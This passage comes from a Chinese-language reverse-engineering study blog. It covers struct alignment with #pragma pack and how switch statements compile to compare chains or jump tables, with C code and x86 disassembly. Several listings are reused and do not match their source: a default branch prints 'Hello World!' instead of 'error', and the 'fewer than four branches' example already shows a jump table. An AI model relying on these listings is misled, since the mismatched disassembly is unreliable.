bc</span><br><span class="line">-4 d</span><br><span class="line">原ebp</span><br><span class="line">+4~20</span><br><span class="line">+24 a</span><br><span class="line">+28 b c</span><br><span class="line">+32(24h) d</span><br></pre></td></tr></table></figure><p>add的10h包括ebp-24h。</p><p>最后通过复制把值取回来。</p><p>全局变量和这个也类似</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><ul><li>结构体和数组的区别：结构体和数组地址都是连续，看等不等宽。等宽多半是数组，不等宽的是结构体。</li><li>他们本质上都是为了存储数据，所以等宽的结构体和数组其实是一个东西</li><li>逆向的本质不是代码还原，只需要知道思想。</li><li>结构体对齐</li></ul><p><code>struct</code></p><p>基值就是全局变量，偏移就是结构体中的一个一个的属性。</p><p><strong>结构特别大的时候，是通过堆栈复制传到函数中的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub esp.18h</span><br><span class="line">mov ecx,6</span><br><span class="line">lea esi,[ebp-18h]</span><br><span class="line">mov edi,esp</span><br><span class="line">rep movsd</span><br></pre></td></tr></table></figure><h2 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h2><p>本质是：选择效率还是选择空间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="comment">//结构体</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p><strong>对齐参数：n为字节对齐数，其取值为1、2、4、8，vc6.0默认为8</strong></p><p>n和结构体成员的sizeof值（宽度）作比较，结构体成员的对齐数取两者的最小值。（主要看图吧，说不明白）</p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    __int64 b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p>如果n为1，也就是1字节对齐。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/nyUhvK1sYxErJ69.png" alt="image-20200909111214659.png"></p><p>2字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//14</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/I6dy48pPHFk3fCB.png" alt="image-20200909111400075.png"></p><p>4字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/iXgO7jUQ3Z9rNaW.png" alt="image-20200909111410178.png"></p><p>8字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/t2eMUwdouiyfaPv.png" alt="image-20200909111424322.png"></p><h3 id="对齐原则"><a href="#对齐原则" class="headerlink" title="对齐原则"></a>对齐原则</h3><ul><li>结构体的大小，是结构内部最大字节成员的整数倍，不足会补齐。（例如结构中最大的类型是int类型，结构体的大小就是4字节的整数倍。而不是8的整数倍），和上面的例子其实是一回事，默认参数为8。</li><li>有疑惑建议写代码，可以参考上述的例子</li><li>建议写代码时，由小到大的顺序进行书写，可以节省空间。</li></ul><h1 id="0x10-switch语句（要看编译器）"><a href="#0x10-switch语句（要看编译器）" class="headerlink" title="0x10 switch语句（要看编译器）"></a>0x10 switch语句（要看编译器）</h1><h2 id="情况1：分支少于4"><a href="#情况1：分支少于4" class="headerlink" title="情况1：分支少于4"></a>情况1：分支少于4</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,1</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D728   push        1</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">5:           case 2:</span><br><span class="line">6:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D739   push        3</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">8:           case 3:</span><br><span class="line">9:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D74A   push        3</span><br><span class="line">0040D74C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">11:           case 4:</span><br><span class="line">12:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D75B   push        4</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       &#125;</span><br></pre></td></tr></table></figure><p>少于四个分支语句，和if else是没有区别的。</p><h2 id="情况2：分支大于等于四个，有序，值是连续的"><a href="#情况2：分支大于等于四个，有序，值是连续的" class="headerlink" title="情况2：分支大于等于四个，有序，值是连续的"></a>情况2：分支大于等于四个，有序，值是连续的</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,1</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D728   push        1</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">5:           case 2:</span><br><span class="line">6:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D739   push        3</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">8:           case 3:</span><br><span class="line">9:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D74A   push        3</span><br><span class="line">0040D74C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">11:           case 4:</span><br><span class="line">12:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D75B   push        4</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       &#125;</span><br></pre></td></tr></table></figure><p><strong>首先把传到switch里的参数减掉最小case值，然后把它和最大case值减最小case值作比较，如果大于则直接跳转default的地址。</strong></p><p>注意不是减一</p><p>否则进入分配好的大表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br></pre></td></tr></table></figure><p>把传入switch的值放进ecx，然后使用ecx*4+地址进行查表。</p><p><img src="https://i.loli.net/2020/09/10/mZnV93JkUYasvqS.png" alt="image-20200910114613580.png"></p><p>这里ecx的值可以为0123分别对应case四个值，通过大表可以进行地址跳转。</p><h2 id="情况3：分支大于等于四个，无序，值是连续的"><a href="#情况3：分支大于等于四个，无序，值是连续的" class="headerlink" title="情况3：分支大于等于四个，无序，值是连续的"></a>情况3：分支大于等于四个，无序，值是连续的</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">6:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,1</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">7:            case 4:</span><br><span class="line">8:                printf(&quot;%d&quot;,4);</span><br><span class="line">0040D728   push        4</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">9:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">10:           case 2:</span><br><span class="line">11:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D739   push        2</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">12:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">13:           case 1:</span><br><span class="line">14:               printf(&quot;%d&quot;,1);</span><br><span class="line">0040D74A   push        1</span><br><span class="line">0040D74C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">15:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">16:           case 3:</span><br><span class="line">17:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D75B   push        3</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">18:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">19:           default:</span><br><span class="line">20:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">21:               break;</span><br><span class="line">22:       &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/10/6KBvJ8gutZ2bV7x.png" alt="image-20200910121302109.png"></p><p>可以看到没有任何区别</p><h2 id="情况4-1：分支大于等于四个，值是连续的（小）。相差较小"><a href="#情况4-1：分支大于等于四个，值是连续的（小）。相差较小" class="headerlink" title="情况4.1：分支大于等于四个，值是连续的（小）。相差较小"></a>情况4.1：分支大于等于四个，值是连续的（小）。相差较小</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">102</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">104</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">105</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,65h</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],4</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">2:            case 101:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D728   push        1</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">5:           case 102:</span><br><span class="line">6:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D739   push        2</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">8:           case 104:</span><br><span class="line">9:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D74A   push        4</span><br><span class="line">0040D74C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">11:           case 105:</span><br><span class="line">12:               printf(&quot;%d&quot;,5);</span><br><span class="line">0040D75B   push        5</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       